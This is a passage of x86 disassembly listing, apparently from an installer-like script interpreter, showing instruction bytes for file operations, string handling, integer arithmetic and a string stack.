  4016b8:	33 c0                	xor    %eax,%eax
  4016ba:	85 c9                	test   %ecx,%ecx
  4016bc:	0f 94 c0             	sete   %al
  4016bf:	23 4d e8             	and    -0x18(%ebp),%ecx
  4016c2:	89 0a                	mov    %ecx,(%edx)
  4016c4:	8b 44 85 dc          	mov    -0x24(%ebp,%eax,4),%eax
  4016c8:	e9 96 15 00 00       	jmp    0x402c63
  4016cd:	ff 34 95 60 b3 47 00 	push   0x47b360(,%edx,4)
  4016d4:	e9 79 15 00 00       	jmp    0x402c52
  4016d9:	8b 0d 80 32 47 00    	mov    0x473280,%ecx
  4016df:	8b 35 34 82 40 00    	mov    0x408234,%esi
  4016e5:	85 c9                	test   %ecx,%ecx
  4016e7:	74 07                	je     0x4016f0
  4016e9:	52                   	push   %edx
  4016ea:	51                   	push   %ecx
  4016eb:	ff d6                	call   *%esi
  4016ed:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4016f0:	8b 0d 6c 32 47 00    	mov    0x47326c,%ecx
  4016f6:	85 c9                	test   %ecx,%ecx
  4016f8:	0f 84 5a 15 00 00    	je     0x402c58
  4016fe:	50                   	push   %eax
  4016ff:	51                   	push   %ecx
  401700:	ff d6                	call   *%esi
  401702:	e9 51 15 00 00       	jmp    0x402c58
  401707:	6a f0                	push   $0xfffffff0
  401709:	5e                   	pop    %esi
  40170a:	e8 4d fd ff ff       	call   0x40145c
  40170f:	ff 75 e0             	push   -0x20(%ebp)
  401712:	50                   	push   %eax
  401713:	ff 15 88 80 40 00    	call   *0x408088
  401719:	85 c0                	test   %eax,%eax
  40171b:	0f 85 37 15 00 00    	jne    0x402c58
  401721:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401728:	e9 2b 15 00 00       	jmp    0x402c58
  40172d:	6a f0                	push   $0xfffffff0
  40172f:	5e                   	pop    %esi
  401730:	e8 27 fd ff ff       	call   0x40145c
  401735:	8b d8                	mov    %eax,%ebx
  401737:	53                   	push   %ebx
  401738:	e8 2d 42 00 00       	call   0x40596a
  40173d:	8b f0                	mov    %eax,%esi
  40173f:	85 f6                	test   %esi,%esi
  401741:	74 43                	je     0x401786
  401743:	6a 5c                	push   $0x5c
  401745:	56                   	push   %esi
  401746:	e8 cb 41 00 00       	call   0x405916
  40174b:	8b f0                	mov    %eax,%esi
  40174d:	0f b7 3e             	movzwl (%esi),%edi
  401750:	33 c0                	xor    %eax,%eax
  401752:	50                   	push   %eax
  401753:	53                   	push   %ebx
  401754:	66 89 06             	mov    %ax,(%esi)
  401757:	ff 15 84 80 40 00    	call   *0x408084
  40175d:	85 c0                	test   %eax,%eax
  40175f:	75 1b                	jne    0x40177c
  401761:	ff 15 80 80 40 00    	call   *0x408080
  401767:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40176c:	75 0b                	jne    0x401779
  40176e:	53                   	push   %ebx
  40176f:	ff 15 7c 80 40 00    	call   *0x40807c
  401775:	a8 10                	test   $0x10,%al
  401777:	75 03                	jne    0x40177c
  401779:	ff 45 fc             	incl   -0x4(%ebp)
  40177c:	66 89 3e             	mov    %di,(%esi)
  40177f:	46                   	inc    %esi
  401780:	46                   	inc    %esi
  401781:	66 85 ff             	test   %di,%di
  401784:	75 bd                	jne    0x401743
  401786:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40178a:	74 1e                	je     0x4017aa
  40178c:	6a e6                	push   $0xffffffe6
  40178e:	e8 a2 fc ff ff       	call   0x401435
  401793:	53                   	push   %ebx
  401794:	68 b0 40 4d 00       	push   $0x4d40b0
  401799:	e8 7d 44 00 00       	call   0x405c1b
  40179e:	53                   	push   %ebx
  40179f:	ff 15 78 80 40 00    	call   *0x408078
  4017a5:	e9 ae 14 00 00       	jmp    0x402c58
  4017aa:	6a f5                	push   $0xfffffff5
  4017ac:	e8 84 fc ff ff       	call   0x401435
  4017b1:	e9 a2 14 00 00       	jmp    0x402c58
  4017b6:	33 f6                	xor    %esi,%esi
  4017b8:	e8 9f fc ff ff       	call   0x40145c
  4017bd:	50                   	push   %eax
  4017be:	e8 38 45 00 00       	call   0x405cfb
  4017c3:	85 c0                	test   %eax,%eax
  4017c5:	0f 84 c5 03 00 00    	je     0x401b90
  4017cb:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4017ce:	e9 90 14 00 00       	jmp    0x402c63
  4017d3:	6a d0                	push   $0xffffffd0
  4017d5:	5e                   	pop    %esi
  4017d6:	e8 81 fc ff ff       	call   0x40145c
  4017db:	6a df                	push   $0xffffffdf
  4017dd:	5e                   	pop    %esi
  4017de:	8b f8                	mov    %eax,%edi
  4017e0:	e8 77 fc ff ff       	call   0x40145c
  4017e5:	6a 13                	push   $0x13
  4017e7:	5e                   	pop    %esi
  4017e8:	8b d8                	mov    %eax,%ebx
  4017ea:	e8 6d fc ff ff       	call   0x40145c
  4017ef:	53                   	push   %ebx
  4017f0:	57                   	push   %edi
  4017f1:	ff 15 74 80 40 00    	call   *0x408074
  4017f7:	85 c0                	test   %eax,%eax
  4017f9:	74 04                	je     0x4017ff
  4017fb:	6a e3                	push   $0xffffffe3
  4017fd:	eb ad                	jmp    0x4017ac
  4017ff:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401803:	0f 84 18 ff ff ff    	je     0x401721
  401809:	57                   	push   %edi
  40180a:	e8 ec 44 00 00       	call   0x405cfb
  40180f:	85 c0                	test   %eax,%eax
  401811:	0f 84 0a ff ff ff    	je     0x401721
  401817:	53                   	push   %ebx
  401818:	57                   	push   %edi
  401819:	e8 6b 4e 00 00       	call   0x406689
  40181e:	6a e4                	push   $0xffffffe4
  401820:	eb 8a                	jmp    0x4017ac
  401822:	33 f6                	xor    %esi,%esi
  401824:	e8 33 fc ff ff       	call   0x40145c
  401829:	8b f0                	mov    %eax,%esi
  40182b:	8d 45 08             	lea    0x8(%ebp),%eax
  40182e:	50                   	push   %eax
  40182f:	53                   	push   %ebx
  401830:	68 04 20 00 00       	push   $0x2004
  401835:	56                   	push   %esi
  401836:	ff 15 70 80 40 00    	call   *0x408070
  40183c:	85 c0                	test   %eax,%eax
  40183e:	74 25                	je     0x401865
  401840:	8b 45 08             	mov    0x8(%ebp),%eax
  401843:	3b c6                	cmp    %esi,%eax
  401845:	76 2a                	jbe    0x401871
  401847:	66 83 38 00          	cmpw   $0x0,(%eax)
  40184b:	74 24                	je     0x401871
  40184d:	56                   	push   %esi
  40184e:	e8 a8 44 00 00       	call   0x405cfb
  401853:	85 c0                	test   %eax,%eax
  401855:	74 0e                	je     0x401865
  401857:	83 c0 2c             	add    $0x2c,%eax
  40185a:	50                   	push   %eax
  40185b:	ff 75 08             	push   0x8(%ebp)
  40185e:	e8 b8 43 00 00       	call   0x405c1b
  401863:	eb 0c                	jmp    0x401871
  401865:	33 c0                	xor    %eax,%eax
  401867:	66 89 03             	mov    %ax,(%ebx)
  40186a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401871:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401875:	0f 85 dd 13 00 00    	jne    0x402c58
  40187b:	68 04 20 00 00       	push   $0x2004
  401880:	53                   	push   %ebx
  401881:	53                   	push   %ebx
  401882:	ff 15 6c 80 40 00    	call   *0x40806c
  401888:	e9 cb 13 00 00       	jmp    0x402c58
  40188d:	83 ce ff             	or     $0xffffffff,%esi
  401890:	e8 c7 fb ff ff       	call   0x40145c
  401895:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401898:	51                   	push   %ecx
  401899:	57                   	push   %edi
  40189a:	68 04 20 00 00       	push   $0x2004
  40189f:	6a 00                	push   $0x0
  4018a1:	50                   	push   %eax
  4018a2:	6a 00                	push   $0x0
  4018a4:	ff 15 68 80 40 00    	call   *0x408068
  4018aa:	85 c0                	test   %eax,%eax
  4018ac:	0f 85 a6 13 00 00    	jne    0x402c58
  4018b2:	33 c0                	xor    %eax,%eax
  4018b4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4018bb:	66 89 07             	mov    %ax,(%edi)
  4018be:	e9 95 13 00 00       	jmp    0x402c58
  4018c3:	6a ef                	push   $0xffffffef
  4018c5:	5e                   	pop    %esi
  4018c6:	e8 91 fb ff ff       	call   0x40145c
  4018cb:	50                   	push   %eax
  4018cc:	57                   	push   %edi
  4018cd:	e8 be 41 00 00       	call   0x405a90
  4018d2:	e9 42 fe ff ff       	jmp    0x401719
  4018d7:	6a 31                	push   $0x31
  4018d9:	5e                   	pop    %esi
  4018da:	e8 7d fb ff ff       	call   0x40145c
  4018df:	8b f0                	mov    %eax,%esi
  4018e1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4018e4:	83 e0 07             	and    $0x7,%eax
  4018e7:	56                   	push   %esi
  4018e8:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4018eb:	89 45 08             	mov    %eax,0x8(%ebp)
  4018ee:	e8 42 40 00 00       	call   0x405935
  4018f3:	56                   	push   %esi
  4018f4:	be e8 a0 40 00       	mov    $0x40a0e8,%esi
  4018f9:	85 c0                	test   %eax,%eax
  4018fb:	74 08                	je     0x401905
  4018fd:	56                   	push   %esi
  4018fe:	e8 18 43 00 00       	call   0x405c1b
  401903:	eb 17                	jmp    0x40191c
  401905:	68 b0 40 4d 00       	push   $0x4d40b0
  40190a:	56                   	push   %esi
  40190b:	e8 0b 43 00 00       	call   0x405c1b
  401910:	50                   	push   %eax
  401911:	e8 33 48 00 00       	call   0x406149
  401916:	50                   	push   %eax
  401917:	e8 1b 43 00 00       	call   0x405c37
  40191c:	56                   	push   %esi
  40191d:	e8 28 43 00 00       	call   0x405c4a
  401922:	bf f8 20 41 00       	mov    $0x4120f8,%edi
  401927:	bb 00 c0 47 00       	mov    $0x47c000,%ebx
  40192c:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  401930:	7c 31                	jl     0x401963
  401932:	56                   	push   %esi
  401933:	e8 c3 43 00 00       	call   0x405cfb
  401938:	33 c9                	xor    %ecx,%ecx
  40193a:	85 c0                	test   %eax,%eax
  40193c:	74 10                	je     0x40194e
  40193e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401941:	51                   	push   %ecx
  401942:	83 c0 14             	add    $0x14,%eax
  401945:	50                   	push   %eax
  401946:	ff 15 64 80 40 00    	call   *0x408064
  40194c:	8b c8                	mov    %eax,%ecx
  40194e:	8b 45 08             	mov    0x8(%ebp),%eax
  401951:	83 c0 fd             	add    $0xfffffffd,%eax
  401954:	0d 00 00 00 80       	or     $0x80000000,%eax
  401959:	23 c1                	and    %ecx,%eax
  40195b:	f7 d8                	neg    %eax
  40195d:	1b c0                	sbb    %eax,%eax
  40195f:	40                   	inc    %eax
  401960:	89 45 08             	mov    %eax,0x8(%ebp)
  401963:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401967:	75 06                	jne    0x40196f
  401969:	56                   	push   %esi
  40196a:	e8 d2 40 00 00       	call   0x405a41
  40196f:	33 c0                	xor    %eax,%eax
  401971:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401975:	0f 95 c0             	setne  %al
  401978:	40                   	inc    %eax
  401979:	50                   	push   %eax
  40197a:	68 00 00 00 40       	push   $0x40000000
  40197f:	56                   	push   %esi
  401980:	e8 dc 40 00 00       	call   0x405a61
  401985:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401988:	83 f8 ff             	cmp    $0xffffffff,%eax
  40198b:	75 6b                	jne    0x4019f8
  40198d:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401991:	75 47                	jne    0x4019da
  401993:	53                   	push   %ebx
  401994:	57                   	push   %edi
  401995:	e8 81 42 00 00       	call   0x405c1b
  40199a:	56                   	push   %esi
  40199b:	53                   	push   %ebx
  40199c:	e8 7a 42 00 00       	call   0x405c1b
  4019a1:	ff 75 f0             	push   -0x10(%ebp)
  4019a4:	68 f0 e0 40 00       	push   $0x40e0f0
  4019a9:	e8 7f 48 00 00       	call   0x40622d
  4019ae:	57                   	push   %edi
  4019af:	53                   	push   %ebx
  4019b0:	e8 66 42 00 00       	call   0x405c1b
  4019b5:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4019b8:	c1 f8 03             	sar    $0x3,%eax
  4019bb:	50                   	push   %eax
  4019bc:	68 f0 e0 40 00       	push   $0x40e0f0
  4019c1:	e8 ea 3e 00 00       	call   0x4058b0
  4019c6:	83 e8 04             	sub    $0x4,%eax
  4019c9:	0f 84 5d ff ff ff    	je     0x40192c
  4019cf:	48                   	dec    %eax
  4019d0:	74 1b                	je     0x4019ed
  4019d2:	56                   	push   %esi
  4019d3:	6a fa                	push   $0xfffffffa
  4019d5:	e9 26 fc ff ff       	jmp    0x401600
  4019da:	ff 75 f4             	push   -0xc(%ebp)
  4019dd:	6a e2                	push   $0xffffffe2
  4019df:	e8 f2 31 00 00       	call   0x404bd6
  4019e4:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4019e8:	e9 2e fd ff ff       	jmp    0x40171b
  4019ed:	ff 05 68 b3 47 00    	incl   0x47b368
  4019f3:	e9 69 12 00 00       	jmp    0x402c61
  4019f8:	ff 75 f4             	push   -0xc(%ebp)
  4019fb:	6a ea                	push   $0xffffffea
  4019fd:	e8 d4 31 00 00       	call   0x404bd6
  401a02:	ff 05 94 b3 47 00    	incl   0x47b394
  401a08:	33 ff                	xor    %edi,%edi
  401a0a:	57                   	push   %edi
  401a0b:	57                   	push   %edi
  401a0c:	ff 75 f8             	push   -0x8(%ebp)
  401a0f:	ff 75 e4             	push   -0x1c(%ebp)
  401a12:	e8 a1 16 00 00       	call   0x4030b8
  401a17:	ff 0d 94 b3 47 00    	decl   0x47b394
  401a1d:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  401a21:	8b d8                	mov    %eax,%ebx
  401a23:	75 06                	jne    0x401a2b
  401a25:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  401a29:	74 0f                	je     0x401a3a
  401a2b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401a2e:	50                   	push   %eax
  401a2f:	57                   	push   %edi
  401a30:	50                   	push   %eax
  401a31:	ff 75 f8             	push   -0x8(%ebp)
  401a34:	ff 15 60 80 40 00    	call   *0x408060
  401a3a:	ff 75 f8             	push   -0x8(%ebp)
  401a3d:	ff 15 bc 80 40 00    	call   *0x4080bc
  401a43:	3b df                	cmp    %edi,%ebx
  401a45:	0f 8d 0d 12 00 00    	jge    0x402c58
  401a4b:	83 fb fe             	cmp    $0xfffffffe,%ebx
  401a4e:	75 13                	jne    0x401a63
  401a50:	6a e9                	push   $0xffffffe9
  401a52:	56                   	push   %esi
  401a53:	e8 d5 47 00 00       	call   0x40622d
  401a58:	ff 75 f4             	push   -0xc(%ebp)
  401a5b:	56                   	push   %esi
  401a5c:	e8 d6 41 00 00       	call   0x405c37
  401a61:	eb 08                	jmp    0x401a6b
  401a63:	6a ee                	push   $0xffffffee
  401a65:	56                   	push   %esi
  401a66:	e8 c2 47 00 00       	call   0x40622d
  401a6b:	68 10 00 20 00       	push   $0x200010
  401a70:	56                   	push   %esi
  401a71:	e8 3a 3e 00 00       	call   0x4058b0
  401a76:	e9 8a fb ff ff       	jmp    0x401605
  401a7b:	33 f6                	xor    %esi,%esi
  401a7d:	e8 da f9 ff ff       	call   0x40145c
  401a82:	ff 75 e0             	push   -0x20(%ebp)
  401a85:	50                   	push   %eax
  401a86:	e8 31 4c 00 00       	call   0x4066bc
  401a8b:	e9 c8 11 00 00       	jmp    0x402c58
  401a90:	6a 31                	push   $0x31
  401a92:	5e                   	pop    %esi
  401a93:	e8 c4 f9 ff ff       	call   0x40145c
  401a98:	ff 75 dc             	push   -0x24(%ebp)
  401a9b:	50                   	push   %eax
  401a9c:	e8 0f 3e 00 00       	call   0x4058b0
  401aa1:	85 c0                	test   %eax,%eax
  401aa3:	0f 84 78 fc ff ff    	je     0x401721
  401aa9:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  401aac:	75 08                	jne    0x401ab6
  401aae:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401ab1:	e9 ad 11 00 00       	jmp    0x402c63
  401ab6:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  401ab9:	0f 85 99 11 00 00    	jne    0x402c58
  401abf:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401ac2:	e9 9c 11 00 00       	jmp    0x402c63
  401ac7:	6a f0                	push   $0xfffffff0
  401ac9:	5e                   	pop    %esi
  401aca:	eb b1                	jmp    0x401a7d
  401acc:	33 f6                	xor    %esi,%esi
  401ace:	46                   	inc    %esi
  401acf:	e8 88 f9 ff ff       	call   0x40145c
  401ad4:	50                   	push   %eax
  401ad5:	e8 57 41 00 00       	call   0x405c31
  401ada:	e9 72 11 00 00       	jmp    0x402c51
  401adf:	6a 02                	push   $0x2
  401ae1:	59                   	pop    %ecx
  401ae2:	e8 5f f9 ff ff       	call   0x401446
  401ae7:	6a 03                	push   $0x3
  401ae9:	59                   	pop    %ecx
  401aea:	89 45 08             	mov    %eax,0x8(%ebp)
  401aed:	e8 54 f9 ff ff       	call   0x401446
  401af2:	33 f6                	xor    %esi,%esi
  401af4:	46                   	inc    %esi
  401af5:	8b d8                	mov    %eax,%ebx
  401af7:	e8 60 f9 ff ff       	call   0x40145c
  401afc:	8b f0                	mov    %eax,%esi
  401afe:	33 c0                	xor    %eax,%eax
  401b00:	66 89 07             	mov    %ax,(%edi)
  401b03:	39 45 e4             	cmp    %eax,-0x1c(%ebp)
  401b06:	74 09                	je     0x401b11
  401b08:	39 45 08             	cmp    %eax,0x8(%ebp)
  401b0b:	0f 84 47 11 00 00    	je     0x402c58
  401b11:	56                   	push   %esi
  401b12:	e8 1a 41 00 00       	call   0x405c31
  401b17:	85 db                	test   %ebx,%ebx
  401b19:	7d 08                	jge    0x401b23
  401b1b:	03 d8                	add    %eax,%ebx
  401b1d:	0f 88 35 11 00 00    	js     0x402c58
  401b23:	3b d8                	cmp    %eax,%ebx
  401b25:	7e 02                	jle    0x401b29
  401b27:	8b d8                	mov    %eax,%ebx
  401b29:	8d 04 5e             	lea    (%esi,%ebx,2),%eax
  401b2c:	50                   	push   %eax
  401b2d:	57                   	push   %edi
  401b2e:	e8 e8 40 00 00       	call   0x405c1b
  401b33:	8b 75 08             	mov    0x8(%ebp),%esi
  401b36:	85 f6                	test   %esi,%esi
  401b38:	0f 84 1a 11 00 00    	je     0x402c58
  401b3e:	7d 11                	jge    0x401b51
  401b40:	57                   	push   %edi
  401b41:	e8 eb 40 00 00       	call   0x405c31
  401b46:	03 f0                	add    %eax,%esi
  401b48:	79 07                	jns    0x401b51
  401b4a:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  401b4e:	8b 75 08             	mov    0x8(%ebp),%esi
  401b51:	81 fe 04 20 00 00    	cmp    $0x2004,%esi
  401b57:	0f 8d fb 10 00 00    	jge    0x402c58
  401b5d:	33 c0                	xor    %eax,%eax
  401b5f:	66 89 04 77          	mov    %ax,(%edi,%esi,2)
  401b63:	e9 f0 10 00 00       	jmp    0x402c58
  401b68:	6a 20                	push   $0x20
  401b6a:	5e                   	pop    %esi
  401b6b:	e8 ec f8 ff ff       	call   0x40145c
  401b70:	6a 31                	push   $0x31
  401b72:	5e                   	pop    %esi
  401b73:	8b f8                	mov    %eax,%edi
  401b75:	e8 e2 f8 ff ff       	call   0x40145c
  401b7a:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401b7e:	50                   	push   %eax
  401b7f:	57                   	push   %edi
  401b80:	75 16                	jne    0x401b98
  401b82:	ff 15 14 81 40 00    	call   *0x408114
  401b88:	85 c0                	test   %eax,%eax
  401b8a:	0f 85 1e ff ff ff    	jne    0x401aae
  401b90:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b93:	e9 cb 10 00 00       	jmp    0x402c63
  401b98:	ff 15 18 81 40 00    	call   *0x408118
  401b9e:	eb e8                	jmp    0x401b88
  401ba0:	33 f6                	xor    %esi,%esi
  401ba2:	46                   	inc    %esi
  401ba3:	e8 b4 f8 ff ff       	call   0x40145c
  401ba8:	68 04 20 00 00       	push   $0x2004
  401bad:	8b d8                	mov    %eax,%ebx
  401baf:	57                   	push   %edi
  401bb0:	53                   	push   %ebx
  401bb1:	ff 15 1c 81 40 00    	call   *0x40811c
  401bb7:	85 c0                	test   %eax,%eax
  401bb9:	74 12                	je     0x401bcd
  401bbb:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401bbf:	74 14                	je     0x401bd5
  401bc1:	57                   	push   %edi
  401bc2:	53                   	push   %ebx
  401bc3:	ff 15 18 81 40 00    	call   *0x408118
  401bc9:	85 c0                	test   %eax,%eax
  401bcb:	75 08                	jne    0x401bd5
  401bcd:	33 c0                	xor    %eax,%eax
  401bcf:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401bd2:	66 89 07             	mov    %ax,(%edi)
  401bd5:	33 c0                	xor    %eax,%eax
  401bd7:	66 89 87 06 40 00 00 	mov    %ax,0x4006(%edi)
  401bde:	e9 75 10 00 00       	jmp    0x402c58
  401be3:	33 c9                	xor    %ecx,%ecx
  401be5:	e8 5c f8 ff ff       	call   0x401446
  401bea:	33 c9                	xor    %ecx,%ecx
  401bec:	41                   	inc    %ecx
  401bed:	8b f0                	mov    %eax,%esi
  401bef:	e8 52 f8 ff ff       	call   0x401446
  401bf4:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  401bf8:	75 12                	jne    0x401c0c
  401bfa:	3b f0                	cmp    %eax,%esi
  401bfc:	0f 8c ac fe ff ff    	jl     0x401aae
  401c02:	7e 8c                	jle    0x401b90
  401c04:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401c07:	e9 57 10 00 00       	jmp    0x402c63
  401c0c:	3b f0                	cmp    %eax,%esi
  401c0e:	0f 82 9a fe ff ff    	jb     0x401aae
  401c14:	0f 86 76 ff ff ff    	jbe    0x401b90
  401c1a:	eb e8                	jmp    0x401c04
  401c1c:	33 db                	xor    %ebx,%ebx
  401c1e:	43                   	inc    %ebx
  401c1f:	8b cb                	mov    %ebx,%ecx
  401c21:	e8 20 f8 ff ff       	call   0x401446
  401c26:	6a 02                	push   $0x2
  401c28:	59                   	pop    %ecx
  401c29:	8b f0                	mov    %eax,%esi
  401c2b:	e8 16 f8 ff ff       	call   0x401446
  401c30:	8b c8                	mov    %eax,%ecx
  401c32:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c35:	83 f8 0c             	cmp    $0xc,%eax
  401c38:	77 66                	ja     0x401ca0
  401c3a:	ff 24 85 80 2d 40 00 	jmp    *0x402d80(,%eax,4)
  401c41:	03 f1                	add    %ecx,%esi
  401c43:	eb 5b                	jmp    0x401ca0
  401c45:	2b f1                	sub    %ecx,%esi
  401c47:	eb 57                	jmp    0x401ca0
  401c49:	0f af ce             	imul   %esi,%ecx
  401c4c:	8b f1                	mov    %ecx,%esi
  401c4e:	eb 50                	jmp    0x401ca0
  401c50:	85 c9                	test   %ecx,%ecx
  401c52:	74 07                	je     0x401c5b
  401c54:	8b c6                	mov    %esi,%eax
  401c56:	99                   	cltd
  401c57:	f7 f9                	idiv   %ecx
  401c59:	eb 1a                	jmp    0x401c75
  401c5b:	33 f6                	xor    %esi,%esi
  401c5d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401c60:	eb 3e                	jmp    0x401ca0
  401c62:	0b f1                	or     %ecx,%esi
  401c64:	eb 3a                	jmp    0x401ca0
  401c66:	23 f1                	and    %ecx,%esi
  401c68:	eb 36                	jmp    0x401ca0
  401c6a:	33 f1                	xor    %ecx,%esi
  401c6c:	eb 32                	jmp    0x401ca0
  401c6e:	33 c0                	xor    %eax,%eax
  401c70:	85 f6                	test   %esi,%esi
  401c72:	0f 94 c0             	sete   %al
  401c75:	8b f0                	mov    %eax,%esi
  401c77:	eb 27                	jmp    0x401ca0
  401c79:	85 f6                	test   %esi,%esi
  401c7b:	75 04                	jne    0x401c81
  401c7d:	85 c9                	test   %ecx,%ecx
  401c7f:	74 08                	je     0x401c89
  401c81:	8b f3                	mov    %ebx,%esi
  401c83:	eb 1b                	jmp    0x401ca0
  401c85:	85 f6                	test   %esi,%esi
  401c87:	75 f4                	jne    0x401c7d
  401c89:	33 f6                	xor    %esi,%esi
  401c8b:	eb 13                	jmp    0x401ca0
  401c8d:	85 c9                	test   %ecx,%ecx
  401c8f:	74 ca                	je     0x401c5b
  401c91:	8b c6                	mov    %esi,%eax
  401c93:	99                   	cltd
  401c94:	f7 f9                	idiv   %ecx
  401c96:	8b f2                	mov    %edx,%esi
  401c98:	eb 06                	jmp    0x401ca0
  401c9a:	d3 e6                	shl    %cl,%esi
  401c9c:	eb 02                	jmp    0x401ca0
  401c9e:	d3 fe                	sar    %cl,%esi
  401ca0:	56                   	push   %esi
  401ca1:	e9 ac 0f 00 00       	jmp    0x402c52
  401ca6:	33 f6                	xor    %esi,%esi
  401ca8:	46                   	inc    %esi
  401ca9:	e8 ae f7 ff ff       	call   0x40145c
  401cae:	6a 02                	push   $0x2
  401cb0:	59                   	pop    %ecx
  401cb1:	8b f0                	mov    %eax,%esi
  401cb3:	e8 8e f7 ff ff       	call   0x401446
  401cb8:	50                   	push   %eax
  401cb9:	56                   	push   %esi
  401cba:	57                   	push   %edi
  401cbb:	ff 15 38 82 40 00    	call   *0x408238
  401cc1:	83 c4 0c             	add    $0xc,%esp
  401cc4:	e9 8f 0f 00 00       	jmp    0x402c58
  401cc9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401ccc:	8b 35 e0 a0 40 00    	mov    0x40a0e0,%esi
  401cd2:	85 c0                	test   %eax,%eax
  401cd4:	74 50                	je     0x401d26
  401cd6:	48                   	dec    %eax
  401cd7:	85 f6                	test   %esi,%esi
  401cd9:	74 0a                	je     0x401ce5
  401cdb:	8b 36                	mov    (%esi),%esi
  401cdd:	85 c0                	test   %eax,%eax
  401cdf:	75 f5                	jne    0x401cd6
  401ce1:	85 f6                	test   %esi,%esi
  401ce3:	75 14                	jne    0x401cf9
  401ce5:	68 10 00 20 00       	push   $0x200010
  401cea:	6a e8                	push   $0xffffffe8
  401cec:	6a 00                	push   $0x0
  401cee:	e8 3a 45 00 00       	call   0x40622d
  401cf3:	50                   	push   %eax
  401cf4:	e9 78 fd ff ff       	jmp    0x401a71
  401cf9:	8d 7e 04             	lea    0x4(%esi),%edi
  401cfc:	57                   	push   %edi
  401cfd:	be e8 a0 40 00       	mov    $0x40a0e8,%esi
  401d02:	56                   	push   %esi
  401d03:	e8 13 3f 00 00       	call   0x405c1b
  401d08:	a1 e0 a0 40 00       	mov    0x40a0e0,%eax
  401d0d:	83 c0 04             	add    $0x4,%eax
  401d10:	50                   	push   %eax
  401d11:	57                   	push   %edi
  401d12:	e8 04 3f 00 00       	call   0x405c1b
  401d17:	a1 e0 a0 40 00       	mov    0x40a0e0,%eax
  401d1c:	56                   	push   %esi
  401d1d:	83 c0 04             	add    $0x4,%eax
  401d20:	50                   	push   %eax
  401d21:	e9 ff 0c 00 00       	jmp    0x402a25
  401d26:	85 d2                	test   %edx,%edx
  401d28:	74 1f                	je     0x401d49
  401d2a:	85 f6                	test   %esi,%esi
  401d2c:	0f 84 ef f9 ff ff    	je     0x401721
  401d32:	8d 46 04             	lea    0x4(%esi),%eax
  401d35:	50                   	push   %eax
  401d36:	57                   	push   %edi
  401d37:	e8 df 3e 00 00       	call   0x405c1b
  401d3c:	8b 06                	mov    (%esi),%eax
  401d3e:	a3 e0 a0 40 00       	mov    %eax,0x40a0e0
  401d43:	56                   	push   %esi
  401d44:	e9 f0 03 00 00       	jmp    0x402139
  401d49:	68 0c 40 00 00       	push   $0x400c
  401d4e:	6a 40                	push   $0x40
  401d50:	ff 15 20 81 40 00    	call   *0x408120
  401d56:	ff 75 dc             	push   -0x24(%ebp)
  401d59:	8b f0                	mov    %eax,%esi
  401d5b:	8d 46 04             	lea    0x4(%esi),%eax
  401d5e:	50                   	push   %eax
  401d5f:	e8 c9 44 00 00       	call   0x40622d
  401d64:	a1 e0 a0 40 00       	mov    0x40a0e0,%eax
  401d69:	89 06                	mov    %eax,(%esi)
  401d6b:	89 35 e0 a0 40 00    	mov    %esi,0x40a0e0
  401d71:	e9 e2 0e 00 00       	jmp    0x402c58
  401d76:	6a 03                	push   $0x3
  401d78:	59                   	pop    %ecx
  401d79:	e8 c8 f6 ff ff       	call   0x401446
  401d7e:	6a 04                	push   $0x4
  401d80:	59                   	pop    %ecx
  401d81:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d84:	e8 bd f6 ff ff       	call   0x401446
  401d89:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  401d8d:	89 45 08             	mov    %eax,0x8(%ebp)
  401d90:	74 0b                	je     0x401d9d
  401d92:	6a 33                	push   $0x33
  401d94:	5e                   	pop    %esi
  401d95:	e8 c2 f6 ff ff       	call   0x40145c
  401d9a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d9d:	f6 45 f0 02          	testb  $0x2,-0x10(%ebp)
  401da1:	74 0b                	je     0x401dae
  401da3:	6a 44                	push   $0x44
  401da5:	5e                   	pop    %esi
  401da6:	e8 b1 f6 ff ff       	call   0x40145c
  401dab:	89 45 08             	mov    %eax,0x8(%ebp)
  401dae:	83 7d d8 21          	cmpl   $0x21,-0x28(%ebp)
  401db2:	75 4b                	jne    0x401dff
  401db4:	33 c9                	xor    %ecx,%ecx
  401db6:	41                   	inc    %ecx
  401db7:	e8 8a f6 ff ff       	call   0x401446
  401dbc:	6a 02                	push   $0x2
  401dbe:	59                   	pop    %ecx
  401dbf:	8b f0                	mov    %eax,%esi
